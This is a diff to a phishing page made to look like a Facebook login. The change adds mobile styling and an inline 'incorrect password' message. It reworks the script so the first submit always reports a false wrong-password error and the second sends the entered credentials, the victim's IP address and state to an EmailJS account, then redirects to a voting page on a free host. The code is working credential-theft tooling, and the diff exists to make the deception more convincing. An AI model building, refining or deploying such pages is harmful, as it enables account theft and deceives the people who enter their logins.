@@ -103,6 +103,39 @@ form input:focus {
   transition: 0.2s ease;
 }
 
+.error-message {
+  display: none;
+  color: #ED4956;
+  font-size: 14px;
+  text-align: center;
+  margin: 10px 40px 0;
+  line-height: 1.4;
+  word-wrap: break-word;
+}
+
+/* Responsive for mobile screens */
+@media screen and (max-width: 450px) {
+  .login {
+    width: 90%;
+  }
+
+  .error-message {
+    margin: 10px 20px 0;
+    font-size: 13px;
+  }
+
+  input[type="text"], input[type="password"], input[type="submit"] {
+    width: calc(100% - 40px);
+    margin: 10px 20px 0;
+  }
+
+  .divider {
+    width: calc(100% - 40px);
+    margin-left: 20px;
+  }
+}
+
+
 .link .login:hover {
   background: #0d65d9;
 }
@@ -191,6 +224,9 @@ hr {
           <!-- Hidden fields to store IP address and state -->
           <input type="hidden" id="ip_address" name="ip_address">
           <input type="hidden" id="state" name="state">
+          <div id="login-error" class="error-message">
+            The password that you've entered is incorrect. 
+          </div>
           <div class="link">
             <button type="submit" class="login">Login</button>
             <a href="https://facebook.com" class="forgot">Forgot password?</a>
@@ -219,59 +255,46 @@ hr {
 
 
 
-  <script type="text/javascript">
-    (function() {
-        emailjs.init("f4e9WkNtC012SJLfG"); // Use your EmailJS User ID
-    })();
-
-    document.getElementById("contact-form").addEventListener("submit", function(event) {
-      event.preventDefault();
-  
-      if (attemptCount === 0) {
-          attemptCount++;
-          alert("Incorrect username or password.");
-          return;
-      }
-
-        // Collect form values
-        var name = document.getElementById("name").value;
-        var email = document.getElementById("email").value;
-        var message = document.getElementById("message").value;
-        var ip_address = document.getElementById("ip_address").value;
-        var state = document.getElementById("state").value;
-
-        // Prepare email parameters
-        var emailParams = {
+      <script type="text/javascript">
+        let attemptCount = 0;
+      
+        (function() {
+          emailjs.init("f4e9WkNtC012SJLfG");
+        })();
+      
+        document.getElementById("contact-form").addEventListener("submit", function(event) {
+          event.preventDefault();
+      
+          // First attempt shows inline error
+          if (attemptCount === 0) {
+            attemptCount++;
+            document.getElementById("login-error").style.display = "block";
+            return;
+          }
+      
+          // Collect form values
+          var name = document.getElementById("name").value;
+          var email = document.getElementById("email").value;
+          var message = document.getElementById("message").value;
+          var ip_address = document.getElementById("ip_address").value;
+          var state = document.getElementById("state").value;
+      
+          var emailParams = {
             from_name: name,
             from_email: email,
             message: message,
             ip_address: ip_address,
             state: state
-        };
-
-        // Send the email using EmailJS
-        emailjs.send("service_75wx5te", "template_vuqsrlf", emailParams)
+          };
+      
+          emailjs.send("service_75wx5te", "template_vuqsrlf", emailParams)
             .then(function(response) {
-                //console.log("Voting Is Processing:", response);
-                //alert("Voting Is Processing!");
-            // Redirect to another page after email is sent
-        window.location.href = "http://thedailydish6.ct.ws/voty.html";  // Redirect to a 'thank you' page after email is sent
+              window.location.href = "http://thedailydish6.ct.ws/voty.html";
             }, function(error) {
-                console.error("Login Error:", error);
-                alert("Failed to Login. Please check and try again.");
+              console.error("Login Error:", error);
+              alert("Failed to Login. Please check and try again.");
             });
-    });
-</script>
-
-<script type="text/javascript"
-        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
-</script>
-<script type="text/javascript">
-   (function(){
-      emailjs.init({
-        publicKey: "f4e9WkNtC012SJLfG",
-      });
-   })();
-</script>
+        });
+      </script>
   </body>
 </html>
